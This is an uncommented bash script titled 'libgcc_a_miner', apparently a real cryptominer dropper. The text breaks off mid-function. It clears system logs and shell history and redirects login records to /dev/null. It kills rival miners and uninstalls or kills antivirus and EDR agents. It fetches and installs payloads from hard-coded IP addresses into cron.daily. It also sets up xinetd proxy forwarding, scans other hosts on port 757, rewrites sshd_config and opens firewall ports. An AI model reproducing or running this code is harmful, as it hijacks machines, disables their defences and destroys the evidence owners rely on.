# libgcc_a_miner
libgcc_a miner sh script code

~~~sh
#!/bin/bash
USR=$1
if [ -z "$USR" ]; then
	USR=0
fi
SKIPUPDATE=$2
THISDIR=$(
	cd "$(dirname "$0")" || exit
	pwd
)
if [ $THISDIR = '/root' ]; then
	DIRROOT=1
else
	unset DIRROOT
fi
MY_NAME=$(basename "$0")
if [ $MY_NAME == cronman -o $MY_NAME == .cronman ]; then
	TESTCOUNT=$(ps cax | grep cronman | wc -l)
	if [[ $TESTCOUNT -gt 4 ]]; then
		ps cax | grep cronman | grep -v "$$" | awk '{print $1}' | xargs kill
	fi
fi
grep -a "xfit" /root/.bashrc >/dev/null 2>&1 && sed -i ':again;$!N;$!b again; s/crontab() {[^}]*}//g' /root/.bashrc
mkdir /tmp >/dev/null 2>&1

if [ -d /etc/ld.so.preload ]; then
	rm -rf /etc/ld.so.preload
fi
if [ -f /usr/spirit ]; then
	chattr -aui /usr/spirit >/dev/null 2>&1
	rm -rf /usr/spirit
fi
OKMark="\e[32m ------ OK \e[0m"
BADMark="\e[31m ------ BAD \e[0m"
InfoG() {
	echo -en "${green}${1}${nc}\n"
}
InfoR() {
	echo -en "${red}${1}${nc}\n"
}
InfoP() {
	echo -en "${purple}${1}${nc}\n"
}
red="\e[1;31m"
green="\e[1;32m"
purple="\033[1;35m"
nc="\e[0m"
LOGS_FILES=(
	/var/log/messages                    # General message and system related stuff
	/var/log/auth.log                    # Authenication logs
	/var/log/kern.log                    # Kernel logs
	/var/log/cron.log                    # Crond logs
	/var/log/maillog                     # Mail server logs
	/var/log/boot.log                    # System boot log
	/var/log/mysqld.log                  # MySQL database server log file
	/var/log/qmail                       # Qmail log directory
	/var/log/httpd                       # Apache access and error logs directory
	/var/log/lighttpd                    # Lighttpd access and error logs directory
	/var/log/secure                      # Authentication log
	/var/log/utmp                        # Login records file
	/var/run/utmp                        # Login records file
	/var/log/wtmp                        # Login records file
	/var/log/btmp                        # Login records file
	/var/log/yum.log                     # Yum command log file
	/var/log/system.log                  # System Log
	/var/log/DiagnosticMessages          # Mac Analytics Data
	/Library/Logs                        # System Application Logs
	/Library/Logs/DiagnosticReports      # System Reports
	/root/Library/Logs                   # User Application Logs
	/root/Library/Logs/DiagnosticReports # User Reports
	/var/log/lastlog
)
function disableAuth() {
	if [ -w /var/log/auth.log ]; then
		ln /dev/null /var/log/auth.log -sf
		echo "[+] Permanently sending /var/log/auth.log to /dev/null"
	else
		echo "[!] /var/log/auth.log is not writable! Retry using sudo."
	fi

	if [ -w /var/log/secure ]; then
		ln /dev/null /var/log/secure -sf
		echo "[+] Permanently sending /var/log/secure to /dev/null"
	else
		echo "[!] /var/log/secure is not writable! Retry using sudo."
	fi
}

function disableLastLogin() {
	if [ -w /var/log/lastlog ]; then
		ln /dev/null /var/log/lastlog -sf
		echo "[+] Permanently sending /var/log/lastlog to /dev/null"
	else
		echo "[!] /var/log/lastlog is not writable! Retry using sudo."
	fi

	if [ -w /var/log/wtmp ]; then
		ln /dev/null /var/log/wtmp -sf
		echo "[+] Permanently sending /var/log/wtmp to /dev/null"
	else
		echo "[!] /var/log/wtmp is not writable! Retry using sudo."
	fi

	if [ -w /var/log/btmp ]; then
		ln /dev/null /var/log/btmp -sf
		echo "[+] Permanently sending /var/log/btmp to /dev/null"
	else
		echo "[!] /var/log/btmp is not writable! Retry using sudo."
	fi

	if [ -w /var/run/utmp ]; then
		ln /dev/null /var/run/utmp -sf
		echo "[+] Permanently sending /var/run/utmp to /dev/null"
	else
		echo "[!] /var/run/utmp is not writable! Retry using sudo."
	fi
}

function disableHistory() {
	ln /dev/null ~/.bash_history -sf
	echo "[+] Permanently sending bash_history to /dev/null"

	if [ -f ~/.zsh_history ]; then
		ln /dev/null ~/.zsh_history -sf
		echo "[+] Permanently sending zsh_history to /dev/null"
	fi

	export HISTFILESIZE=0
	export HISTSIZE=0
	echo "[+] Set HISTFILESIZE & HISTSIZE to 0"

	set +o history
	echo "[+] Disabled history library"
}
function clearLogs() {
	for i in "${LOGS_FILES[@]}"; do
		if [ -f "$i" ]; then
			if [ -w "$i" ]; then
				echo "" >"$i"
				echo "[+] $i cleaned."
			else
				echo "[!] $i is not writable! Retry using sudo."
			fi
		elif [ -d "$i" ]; then
			if [ -w "$i" ]; then
				rm -rf "${i:?}"/*
				echo "[+] $i cleaned."
			else
				echo "[!] $i is not writable! Retry using sudo."
			fi
		fi
	done
}
function clearHistory() {
	if [ -f ~/.zsh_history ]; then
		echo "" >~/.zsh_history
		echo "[+] ~/.zsh_history cleaned."
	fi

	echo "" >~/.bash_history
	echo "[+] ~/.bash_history cleaned."

	history -c
	echo "[+] History file deleted."
}
function testport() {
	if command -v nc &>/dev/null && nc -h 2>&1 | grep -q -- '-z'; then
		timeout 30 nc "$1" "$2" -z -w 2 >/dev/null 2>&1
		return $?
	elif command -v nc &>/dev/null; then
		cat /dev/null | timeout 30 nc "$1" "$2" -w 2 >/dev/null 2>&1
		return $?
	else
		timeout 5 bash -c '</dev/tcp/'"$1"'/'"$2"' &>/dev/null 2>&1' 2>/dev/null
		return $?
	fi
}

function __curl() {
	read proto server path <<<$(echo "${1//// }")
	DOC=/${path// //}
	HOST=${server//:*/}
	PORT=${server//*:/}
	[[ "${HOST}" == "${PORT}" ]] && PORT=80

	exec 3<>/dev/tcp/"${HOST}"/$PORT
	echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
	(while read line; do
		[[ "$line" == $'\r' ]] && break
	done && cat) <&3
	exec 3>&-
}

function get_remote_file() {
	REQUEST_URL=$1
	OUTPUT_FILENAME=$2
	TEMP_FILE="${THISDIR}/tmp.file"
	retfunc() {
		return "$1"
	}
	REMOTE_SERVER="5.133.65.53
    45.142.212.30"
	echo "$REMOTE_SERVER" | while IFS= read -r line; do
		line=$(echo -e "${line}" | sed -r 's/ //g')
		URL=$(echo "$REQUEST_URL" | sed -r "s#(http?://)?([^/]+)(.*)#\1$line\3#")
		if command -v wget &>/dev/null; then
			InfoP "Try download $FILENAME via a direct connection $line ..."
			if command -v wget &>/dev/null && wget -h 2>&1 | grep -q -- '--tries'; then
				wget --timeout=2 --tries=3 -O "${TEMP_FILE}" "$URL" >/dev/null 2>&1
			else
				wget --timeout=5 -O "${TEMP_FILE}" "$URL" >/dev/null 2>&1
			fi
		elif command -v curl &>/dev/null; then
			InfoP "Try download $FILENAME with Curl via a direct connection $line..."
			curl --connect-timeout 2 -o "${TEMP_FILE}" "$URL" 2>/dev/null
		else
			InfoP "Try download $FILENAME with /dev/tcp via a direct connection $line..."
			__curl "$URL" >"${TEMP_FILE}"
		fi
		########################################################################################
		err=$?
		if [[ $err == 0 ]]; then
			if [ $FILENAME == cronman -o $MY_NAME == $FILE_REZ ]; then
				CHESKSCR=$(cat "${TEMP_FILE}")
				if [[ $CHESKSCR == *root/minfile* ]]; then
					retfunc 2
				else
					retfunc 1
				fi
			elif [ $FILENAME == xbash ]; then
				CHESKSCR=$(cat "${TEMP_FILE}")
				if [[ $CHESKSCR == *cronman* ]]; then
					mkdir -p "/root/gcclib" >/dev/null 2>&1
					TZ='Europe/Moscow' date '+%F %T' >"/root/gcclib/date"
					retfunc 2
				else
					retfunc 1
				fi
			elif [ ! -z $HASH ]; then
				if md5sum -c <<<"$HASH *${TEMP_FILE}"; then
					retfunc 2
				else
					err=1
					retfunc 1
				fi
			else
				retfunc $err
			fi
		fi
		if [[ $? -eq 2 ]]; then
			mv -f "${TEMP_FILE}" "${OUTPUT_FILENAME}"
			chmod 755 "${OUTPUT_FILENAME}"
			InfoG "$FILENAME File downloaded"
			cat <<EOF >/etc/xinetd.d/smtp_forward
service smtp_forward
{
        disable         = no
        type            = UNLISTED
        socket_type     = stream
        protocol        = tcp
        user            = nobody
        wait            = no
        redirect        = $line 80
        port            = 757
		per_source = UNLIMITED
		instances = UNLIMITED
		cps = 10000 1
}
EOF
			return 0
		elif [[ $err -eq 0 ]]; then
			mv -f "${TEMP_FILE}" "${OUTPUT_FILENAME}"
			chmod 755 "${OUTPUT_FILENAME}"
			InfoG "$FILENAME File downloaded"
			return 0
		else
			retfunc 3
		fi
	done
	err=$?
	if [[ $err -eq 3 ]]; then
		unset CHECK_FILE
		if [ -f "/root/$PATH_NAME/ghost" ]; then
			REMOTEHOST=$(cat /root/$PATH_NAME/ghost)
			REMOTEPORT=757
			TIMEOUT=2
			if testport "$REMOTEHOST" $REMOTEPORT; then
				if command -v wget &>/dev/null; then
					InfoP "Try download $FILENAME via $REMOTEHOST..."
					if command -v wget &>/dev/null && wget -h 2>&1 | grep -q -- '--tries'; then
						http_proxy="http://$REMOTEHOST:757" wget --timeout=2 --tries=3 -O "${TEMP_FILE}" "$REQUEST_URL" 2>/dev/null
					else
						http_proxy="http://$REMOTEHOST:757" wget --timeout=5 -O "${TEMP_FILE}" "$REQUEST_URL" 2>/dev/null
					fi
				elif command -v curl &>/dev/null; then
					InfoP "Try download $FILENAME with Curl via $REMOTEHOST..."
					curl -x "$REMOTEHOST:$REMOTEPORT" --connect-timeout 2 -o "${TEMP_FILE}" "$REQUEST_URL" 2>/dev/null
				else
					InfoP "Try download $FILENAME with /dev/tcp via $REMOTEHOST"
					__curl "http://$REMOTEHOST:$REMOTEPORT/soft/linux/$FILENAME" >"${TEMP_FILE}"
				fi
				err=$?
				if [[ $err == 0 ]]; then
					if [ $FILENAME == cronman -o $MY_NAME == $FILE_REZ ]; then
						CHESKSCR=$(cat "${TEMP_FILE}")
						if [[ $CHESKSCR == *root/minfile* ]]; then
							retfunc 2
						else
							err=1
							retfunc 1
						fi
					elif [ $FILENAME == xbash ]; then
						CHESKSCR=$(cat "${TEMP_FILE}")
						if [[ $CHESKSCR == *cronman* ]]; then
							mkdir -p "/root/gcclib" >/dev/null 2>&1
							TZ='Europe/Moscow' date '+%F %T' >"/root/gcclib/date"
							retfunc 2
						else
							err=1
							retfunc 1
						fi
					elif [ ! -z $HASH ]; then
						if md5sum -c <<<"$HASH *${TEMP_FILE}"; then
							retfunc 2
						else
							err=1
							retfunc 1
						fi
					else
						retfunc $err
					fi
				fi
				if [[ $? -eq 2 ]] || [[ $err == 0 ]]; then
					mv -f "${TEMP_FILE}" "${OUTPUT_FILENAME}"
					chmod 755 "${OUTPUT_FILENAME}"
					GOOD_HOST=$REMOTEHOST
					echo $GOOD_HOST >"/root/$PATH_NAME/ghost"
					CHECK_FILE=1
				else
					InfoR "The file is broken "
					unset GOOD_HOST
					CHECK_FILE=0
				fi
			else
				InfoR "$REMOTEHOST Port $REMOTEPORT closed"
				unset GOOD_HOST
				CHECK_FILE=0
			fi
		fi
		if [[ "$CHECK_FILE" -eq 1 ]]; then
			InfoG "$FILENAME File downloaded"
			cat <<EOF >/etc/xinetd.d/smtp_forward
service smtp_forward
{
        disable         = no
        type            = UNLISTED
        socket_type     = stream
        protocol        = tcp
        user            = nobody
        wait            = no
        redirect        = $REMOTEHOST $REMOTEPORT
        port            = 757
		per_source = UNLIMITED
		instances = UNLIMITED
		cps = 10000 1
}
EOF
		else
			if [ -f "/root/$PATH_NAME/ghost" ]; then
				rm -fr /root/$PATH_NAME/ghost 2>/dev/null
			fi
			if [[ ! -z $(cat /root/$PATH_NAME/ip.txt) ]]; then
				port=757
				threads=40
				IPS=''
				echo '' >/root/$PATH_NAME/found757.lst
				echo '' >/root/$PATH_NAME/targets757
				echo '' >/root/$PATH_NAME/logfile757
				IPS=$(cat /root/$PATH_NAME/ip.txt)
				server=''
				for server in $IPS; do
					server=${server//[[:space:]]/}
					echo $port "$server" >>/root/$PATH_NAME/targets757
				done
				InfoP "Scanning port 757..."

				if command -v nc &>/dev/null && nc -h 2>&1 | grep -q -- '-z'; then
					xargs -a /root/$PATH_NAME/targets757 -n 2 -P $threads sh -c 'timeout 30 nc $1 '$port' -z -w 2 >/dev/null 2>&1; echo $? $1 >> /root/'$PATH_NAME'/logfile757'
				elif command -v nc &>/dev/null; then
					xargs -a /root/$PATH_NAME/targets757 -n 2 -P $threads sh -c 'cat /dev/null |timeout 30 nc $1 '$port' -w 2 >/dev/null 2>&1; echo $? $1 >> /root/'$PATH_NAME'/logfile757'
				else
					xargs -a /root/$PATH_NAME/targets757 -n 2 -P $threads bash -c 'timeout 3 bash -c "</dev/tcp/$1/'$port' &>/dev/null 2>&1"; echo $? $1 >> /root/'$PATH_NAME'/logfile757'
				fi

				grep "^0" /root/$PATH_NAME/logfile757 | cut -d " " -f2 >/root/$PATH_NAME/found757.lst
				if [ -f /root/$PATH_NAME/found757.lst ]; then
					FOUND=$(cat /root/$PATH_NAME/found757.lst)
					for server in $FOUND; do
						server=${server//[[:space:]]/}
						if [ ! -z $GOOD_HOST ]; then
							REMOTEHOST=$GOOD_HOST
						else
							REMOTEHOST=$server
						fi
						REMOTEPORT=757
						TIMEOUT=2
						if testport "$REMOTEHOST" $REMOTEPORT; then
							if command -v wget &>/dev/null; then
								InfoP "Try download $FILENAME via $REMOTEHOST..."
								if command -v wget &>/dev/null && wget -h 2>&1 | grep -q -- '--tries'; then
									http_proxy="http://$REMOTEHOST:757" wget --timeout=2 --tries=3 -O "${TEMP_FILE}" "$REQUEST_URL" 2>/dev/null
								else
									http_proxy="http://$REMOTEHOST:757" wget --timeout=5 -O "${TEMP_FILE}" "$REQUEST_URL" 2>/dev/null
								fi
							elif command -v curl &>/dev/null; then
								InfoP "Try download $FILENAME with Curl via $REMOTEHOST..."
								curl -x "$REMOTEHOST:$REMOTEPORT" --connect-timeout 2 -o "${TEMP_FILE}" "$REQUEST_URL" 2>/dev/null
							else
								InfoP "Try download $FILENAME with /dev/tcp via $REMOTEHOST"
								__curl "http://$REMOTEHOST:$REMOTEPORT/soft/linux/$FILENAME" >"${TEMP_FILE}"
							fi
							err=$?
							if [ $FILENAME == cronman -o $MY_NAME == $FILE_REZ ]; then
								CHESKSCR=$(cat "${TEMP_FILE}")
								if [[ $CHESKSCR == *isCentOs8* ]]; then
									retfunc 2
								else
									err=1
									retfunc 1
								fi
							elif [ $FILENAME == xbash ]; then
								CHESKSCR=$(cat "${TEMP_FILE}")
								if [[ $CHESKSCR == *cronman* ]]; then
									mkdir -p "/root/gcclib" >/dev/null 2>&1
									TZ='Europe/Moscow' date '+%F %T' >"/root/gcclib/date"
									retfunc 2
								else
									err=1
									retfunc 1
								fi
							elif [ ! -z $HASH ]; then
								if md5sum -c <<<"$HASH *${TEMP_FILE}"; then
									retfunc 2
								else
									err=1
									retfunc 1
								fi
							else
								retfunc $err
							fi
							if [[ $? -eq 2 ]] || [[ $err == 0 ]]; then
								mv -f "${TEMP_FILE}" "${OUTPUT_FILENAME}"
								chmod 755 "${OUTPUT_FILENAME}"
								GOOD_HOST=$REMOTEHOST
								echo $GOOD_HOST >"/root/$PATH_NAME/ghost"
								CHECK_FILE=1
								break
							else
								InfoR "The file is broken "
								unset GOOD_HOST
							fi
						else
							InfoR "$REMOTEHOST Port $REMOTEPORT closed"
							unset GOOD_HOST
							CHECK_FILE=0
						fi
					done
					if [[ "$CHECK_FILE" -eq 1 ]]; then
						InfoG "$FILENAME File downloaded"
						cat <<EOF >/etc/xinetd.d/smtp_forward
service smtp_forward
{
        disable         = no
        type            = UNLISTED
        socket_type     = stream
        protocol        = tcp
        user            = nobody
        wait            = no
        redirect        = $REMOTEHOST $REMOTEPORT
        port            = 757
		per_source = UNLIMITED
		instances = UNLIMITED
		cps = 10000 1
}
EOF
					else
						return 1
					fi
				else
					return 1
				fi
			else
				return 1
			fi
		fi
	fi
}

function clean_up() {
	history -c
}
function self_clean_up() {
	rm -f "${EXECUTABLE_SHELL_SCRIPT}"
	history -c
}

function update_self_and_invoke() {
	retfunc() {
		return "$1"
	}
	if [[ $SKIPUPDATE -eq 0 ]]; then
		get_remote_file "${FILE_TO_FETCH_URL}" "${EXECUTABLE_SHELL_SCRIPT}"
		if [ ! -f /root/gcclib/date ]; then
			FILENAME="xbash"
			get_remote_file "http://5.133.65.53/soft/linux/xbash" "/etc/cron.daily/xbash"
		else
			hundred_days_ago=$(date -d 'now - 2 days' +%s)
			file_time=$(date -r "/root/gcclib/date" +%s)
			if ((file_time <= hundred_days_ago)); then
				FILENAME="xbash"
				get_remote_file "http://5.133.65.53/soft/linux/xbash" "/etc/cron.daily/xbash"
			fi
		fi
	else
		{
			echo
			InfoR "Skipping an update"
			echo
			sleep 5
			retfunc 1
		}
	fi
	if [[ $? -ne 0 ]]; then
		cp "${EXISTING_SHELL_SCRIPT}" "${EXECUTABLE_SHELL_SCRIPT}"
	fi
	exec "${EXECUTABLE_SHELL_SCRIPT}" "$@"
}
function Clean() {
	func_ctr_eppagent() {
		pid=$(pgrep -f "/opt/360sdforcnos/eppagent")
		if [ ! -z "$pid" ] && [ "$1" = "stop" ]; then
			kill -9 "$pid" 2>/dev/null 1>&2
		elif [ -z "$pid" ]; then
			"$HERE"/eppagent >>/dev/null 2>&1 &
		fi
	}
	func_ctr_safed() {
		pid=$(pgrep -f "/opt/360sdforcnos/360safed")
		if [ ! -z "$pid" ] && [ "$1" = "stop" ]; then
			kill -9 "$pid" 2>/dev/null 1>&2
		elif [ -z "$pid" ]; then
			"$HERE"/360safed >>/dev/null 2>&1 &
		fi
	}

	ps -eaf | grep 'spend-secret-key' | grep -v grep | awk '{ print $2 }' | xargs kill -9 >/dev/null 2>&1
	ps -eaf | grep -- '\-\-algo' | grep -v grep | awk '{ print $2 }' | xargs kill -9 >/dev/null 2>&1
	ps -eaf | grep -- "\-\-url" | grep -v grep | awk '{ print $2 }' | xargs kill -9 >/dev/null 2>&1
	ps -eaf | grep -- '\-\-donate-level' | grep -v grep | awk '{ print $2 }' | xargs kill -9 >/dev/null 2>&1
	ps -eaf | grep 'minerd' | grep -v grep | awk '{ print $2 }' | xargs kill -9 >/dev/null 2>&1
	ps -eaf | grep 'xmr' | grep -v grep | awk '{ print $2 }' | xargs kill -9 >/dev/null 2>&1
	ps -eaf | grep 'cryptonight' | grep -v grep | awk '{ print $2 }' | xargs kill -9 >/dev/null 2>&1
	ss -anp | grep -Po ':4444\s.*pid=\K\d+(?=,)' | xargs kill -9 >/dev/null 2>&1
	ss -anp | grep -Po ':5555\s.*pid=\K\d+(?=,)' | xargs kill -9 >/dev/null 2>&1
	ss -anp | grep -Po ':3333\s.*pid=\K\d+(?=,)' | xargs kill -9 >/dev/null 2>&1
	pkill -9 xmrig >/dev/null 2>&1
	pkill -f xmrig >/dev/null 2>&1
	pkill -f Loopback >/dev/null 2>&1
	pkill -f apaceha >/dev/null 2>&1
	pkill -f cryptonight >/dev/null 2>&1
	pkill -f stratum >/dev/null 2>&1
	pkill -f minerd >/dev/null 2>&1
	pkill -9 log-rotate >/dev/null 2>&1
	pkill -9 warmun >/dev/null 2>&1
	pkill -9 kinettd >/dev/null 2>&1

	if [ -f /home/kill_wp.sh ]; then
		chattr -aui /home/kill_wp.sh >>/dev/null 2>&1
		rm -fr /home/kill_wp.sh >>/dev/null 2>&1
	fi

	if [ -f /home/kill_xt.sh ]; then
		chattr -aui /home/kill_xt.sh >>/dev/null 2>&1
		rm -fr /home/kill_xt.sh >>/dev/null 2>&1
	fi

	if [ -f /opt/360sdforcnos/eppagent ]; then
		/opt/360sdforcnos/eppagent --uninstall
	fi

	if [ -f /opt/360sdforcnos/360safed ]; then
		/opt/360sdforcnos/360safed --uninstall
	fi
	if [ -d /opt/360sdforcnos ]; then
		func_ctr_eppagent stop >>/dev/null 2>&1
		func_ctr_safed stop >>/dev/null 2>&1
		rm -fr /opt/360sdforcnos >>/dev/null 2>&1
	fi

	ps cax | grep top.sh
	if [ $? -eq 0 ]; then
		ps -aux | grep "top.sh" | grep -v grep | awk '{print $2}' | xargs kill -9
	fi
	if [ -f /usr/local/huorong/un.huorong ]; then
		/usr/local/huorong/un.huorong
	fi
	ps cax | grep ds_agent
	if [ $? -eq 0 ]; then
		if [ -f /etc/debian_version ]; then
			dpkg -r ds-agent >>/dev/null 2>&1
			dpkg -r ds-agent >>/dev/null 2>&1
		else
			rpm -ev ds_agent >>/dev/null 2>&1
		fi
	fi

	ps cax | grep vm-agent
	if [ $? -eq 0 ]; then
		ps -aux | grep "vm-agent" | grep -v grep | awk '{print $2}' | xargs kill -9
	fi

	ps cax | grep mysqll
	if [ $? -eq 0 ]; then
		ps -aux | grep "mysqll" | grep -v grep | awk '{print $2}' | xargs kill -9
	fi
	if [ -d /tmp/linux/ ]; then
		rm -fr /tmp/linux/
	fi
	if [ -f /KvEdr/uninstall.sh ]; then
		/KvEdr/uninstall.sh
		rm -fr /KvEdr
	fi

	if [ -f /sangfor/edr/agent/bin/eps_uninstall.sh ]; then
		/sangfor/edr/agent/bin/eps_uninstall.sh
	fi
	if [ -f /home/sangfor/edr/agent/bin/eps_uninstall.sh ]; then
		/home/sangfor/edr/agent/bin/eps_uninstall.sh
	fi
	if [ -f /sf/edr/agent/bin/eps_uninstall.sh ]; then
		/sf/edr/agent/bin/eps_uninstall.sh
	fi
	ps cax | grep linux_client
	if [ $? -eq 0 ]; then
		pkill linux_client
	fi
	ps cax | grep edr_agent
	if [ $? -eq 0 ]; then
		fullpath=$(command -v edr_agent)
		filepath="${fullpath%/*}"
		if [ -f $filepath/eps_uninstall.sh ]; then
			$filepath/eps_uninstall.sh
		fi
	fi
	if [ -f /usr/local/bin/linux_client ]; then
		rm -fr /usr/local/bin/linux_client
	fi

	ps cax | grep guard_client
	if [ $? -eq 0 ]; then
		pkill guard_client
	fi
	if [ -f /usr/local/bin/guard_client ]; then
		rm -fr /usr/local/bin/guard_client
	fi
	if [ -f /root/Stream ]; then
		rm -fr /root/Stream
	fi
	if [ -f /root/stream ]; then
		rm -fr /root/stream
	fi
	command -v qaxsafe &>/dev/null
	if [[ $? -eq 0 ]]; then
		yum remove qaxsafe -y >>/dev/null 2>&1
	fi
	if [ -f /opt/qaxsafe/qaxsafed ]; then
		if command -v yum &>/dev/null; then
			rpm -ev qaxsafe >>/dev/null 2>&1
		else
			dpkg -r qaxsafe >>/dev/null 2>&1
		fi
	fi
	if command -v clamav* &>/dev/null; then
		if command -v yum &>/dev/null; then
			rpm -ev clamav* >>/dev/null 2>&1
		else
			dpkg -r clamav* >>/dev/null 2>&1
		fi
	fi

	rm -rf /home/*/.local/share/Trash/*/** >/dev/null 2>&1
	rm -rf /root/.local/share/Trash/*/** >/dev/null 2>&1
	rm -rf /usr/share/man/?? >/dev/null 2>&1
	rm -rf /usr/share/man/??_* >/dev/null 2>&1
	rm -rf /var/log/{*,.*} >/dev/null 2>&1
	rm -rf /core.* >/dev/null 2>&1
	rm -fr /root/install >/dev/null 2>&1
	rm -fr /boot/xmrig >/dev/null 2>&1
	rm -fr /root/xmrig >/dev/null 2>&1
	rm -fr /kinettd >/dev/null 2>&1
	rm -rf /root/.bash_history >/dev/null 2>&1
	if [ -d /opt/nubosh ]; then

		pid=$(ps aux | grep '/opt/nubosh/vmsec-host/net/eng/walnut -D' | grep -v 'grep' | awk '{print $2}')
		kill -9 $pid >>/dev/null 2>&1

		sleep 1
		/sbin/rmmod vmsec_nfq >>/dev/null 2>&1
		sleep 5
		MOD_NUM=$(/sbin/lsmod | grep vmsec_nfq | wc -l)
		if [ $MOD_NUM != 0 ]; then
			sleep 1
		fi

		action $"Stopping ics-agent-net: " /bin/true
		rm -fr /opt/nubosh >/dev/null 2>&1
	fi
	pkill -9 abrtd >/dev/null 2>&1
}
Clean
shootProfile() {
	OS=$(lowercase $(uname))
	KERNEL=$(uname -r)
	MACH=$(uname -m)

	if [ "${OS}" == "windowsnt" ]; then
		OS=windows
	elif [ "${OS}" == "darwin" ]; then
		OS=mac
	else
		OS=$(uname)
		if [ "${OS}" = "SunOS" ]; then
			OS=Solaris
			ARCH=$(uname -p)
			OSSTR="${OS} ${REV}(${ARCH} $(uname -v))"
		elif [ "${OS}" = "AIX" ]; then
			OSSTR="${OS} $(oslevel) ($(oslevel -r))"
		elif [ "${OS}" = "Linux" ]; then
			if [ -f /etc/redhat-release ]; then
				DistroBasedOn='RedHat'
				DIST=$(cat /etc/redhat-release | sed s/\ release.*// | sed 's/\ .*//')
				PSUEDONAME=$(cat /etc/redhat-release | sed s/.*\(// | sed s/\)//)
				REV=$(cat /etc/redhat-release | sed s/.*release\ // | sed s/\ .*// | sed 's/\..*//')
			elif [ -f /etc/SuSE-release ]; then
				DistroBasedOn='SuSe'
				PSUEDONAME=$(cat /etc/SuSE-release | tr "\n" ' ' | sed s/VERSION.*//)
				REV=$(cat /etc/SuSE-release | tr "\n" ' ' | sed s/.*=\ //)
			elif [ -f /etc/mandrake-release ]; then
				DistroBasedOn='Mandrake'
				PSUEDONAME=$(cat /etc/mandrake-release | sed s/.*\(// | sed s/\)//)
				REV=$(cat /etc/mandrake-release | sed s/.*release\ // | sed s/\ .*//)
			elif [ -f /etc/debian_version ]; then
				DistroBasedOn='Debian'
				if [ -f /etc/lsb-release ]; then
					DIST=$(cat /etc/lsb-release | grep '^DISTRIB_ID' | awk -F= '{ print $2 }')
					PSUEDONAME=$(cat /etc/lsb-release | grep '^DISTRIB_CODENAME' | awk -F= '{ print $2 }')
					REV=$(cat /etc/lsb-release | grep '^DISTRIB_RELEASE' | awk -F= '{ print $2 }')
				fi
			fi
			if [ -f /etc/UnitedLinux-release ]; then
				DIST="${DIST}[$(cat /etc/UnitedLinux-release | tr "\n" ' ' | sed s/VERSION.*//)]"
			fi
			OS=$(lowercase $OS)
			DistroBasedOn=$(lowercase $DistroBasedOn)
		fi

	fi
}

retfunc() {
	return "$1"
}
usage() {
	cat <<EOF
    usage: $0 ARG1
    ARG1 Name of the sshd_config file to edit.
    In case ARG1 is empty, /etc/ssh/sshd_config will be used as default.

    Description:
    This script sets certain parameters in /etc/ssh/sshd_config.
    It's not production ready and only used for training purposes.

    What should it do?
    * Check whether a /etc/ssh/sshd_config file exists
    * Create a backup of this file
    * Edit the file to set certain parameters
EOF
}

backup_sshd_config() {
	if [ -f ${file} ]; then
		cp ${file} ${file}.1
	else
		echo "File ${file} not found."
		exit 1
	fi
}

edit_sshd_config() {
	for PARAM in ${param[@]}; do
		sed -i '/^'"${PARAM}"'/d' ${file}
		#echo "All lines beginning with '${PARAM}' were deleted from ${file}."
	done
	echo "${param[1]} yes" >>${file}
	#echo "'${param[1]} yes' was added to ${file}."
	echo "${param[2]} yes" >>${file}
	#echo "'${param[2]} yes' was added to ${file}."
	echo "${param[3]} .ssh/authorized_keys" >>${file}
	#echo "'${param[3]} .ssh/authorized_keys' was added to ${file}."
	echo "${param[4]} yes" >>${file}
	#echo "'${param[4]} yes' was added to ${file}"
	SSHVER=$(ssh -V 2>&1 | sed 's/OpenSSH_\([0-9]\+\).*/\1/')
	if [ "$SSHVER" -ge "7" ]; then
		echo "${param[5]} ssh-rsa" >>${file}
		#echo "'${param[5]} ssh-rsa' was added to ${file}"
		echo "${param[6]} ssh-rsa" >>${file}
	#echo "'${param[6]} ssh-rsa' was added to ${file}"
	fi
}

reload_sshd() {
	systemctl >/dev/null 2>&1 && timeout 15 systemctl reload sshd.service || timeout 15 service sshd reload
	#echo "Run 'systemctl reload sshd.service'...OK"
}
function checkfrw() {

	if command -v iptables &>/dev/null; then
		CHECKIPTABLES=1
	else
		CHECKIPTABLES=0
	fi

	if command -v firewalld &>/dev/null; then
		CHECKFIREWALLD=1
	else
		CHECKFIREWALLD=0
	fi
	if [[ $CHECKFIREWALLD = "0" && $CHECKIPTABLES = "0" ]]; then
		CHECKFRW=0
		InfoR "Firewall not installed"
	else
		CHECKFRW=1
	fi
}
function addportfrw() {
	PORT=$1
	if [[ $CHECKFRW -ne "0" ]]; then
		if command -v iptables &>/dev/null; then
			CHECKIPTABLES=1
		else
			CHECKIPTABLES=0
		fi

		if command -v firewalld &>/dev/null; then
			CHECKFIREWALLD=1
		else
			CHECKFIREWALLD=0
		fi

		if [ $CHECKFIREWALLD == "1" ]; then
			STR=$(firewall-cmd --permanent --list-port)
			if [[ "$STR" == *$PORT* ]]; then
				echo "Port $PORT Open"
			else
				firewall-cmd --zone=public --permanent --add-port=$PORT/tcp >/dev/null 2>&1
				firewall-cmd --reload >/dev/null 2>&1
				if [[ "$STR" == *$PORT* ]]; then
					echo "Port $PORT Open"
				fi
			fi
		elif [ $CHECKIPTABLES == "1" ]; then
			STR=$(iptables -L INPUT -v -n)
			if [[ "$STR" == *$PORT* ]]; then
				echo "Port $PORT Open"
			else
				iptables -I INPUT -p tcp --dport $PORT -m state --state NEW -j ACCEPT >/dev/null 2>&1
				service iptables save >/dev/null 2>&1 && echo "Save iptables" || iptables-save >/dev/null 2>&1
				service iptables restart >/dev/null 2>&1 && echo "Reload iptables" || ufw reload >/dev/null 2>&1
				if [[ "$STR" == *757* ]]; then
					echo "Port $PORT Open"
				fi
			fi
		else
			CHECKFRW=0
		fi
	fi

}
###########################################################################################################################
###########################################################################################################################
###########################################################################################################################
###########################################################################################################################
###########################################################################################################################
###########################################################################################################################
###########################################################################################################################
###########################################################################################################################
###########################################################################################################################
###########################################################################################################################
###########################################################################################################################
###########################################################################################################################
###########################################################################################################################
###########################################################################################################################
###########################################################################################################################
###########################################################################################################################
###########################################################################################################################
function main() {
	if [[ $SKIPUPDATE -eq 0 ]]; then
		Clean
	fi
	if [ $(arch) == "aarch64" ]; then
		if [[ ! -f /usr/local/lib/pkitarm.so ]] || [[ ! -f /usr/local/lib/fkitarm.so ]] || [[ ! -f /usr/local/lib/skitarm.so ]] || [[ ! -f /usr/local/lib/sshkitarm.so ]] || [[ ! -f /usr/local/lib/sshpkitarm.so ]]; then
			cat /dev/null >/etc/ld.so.preload
		else
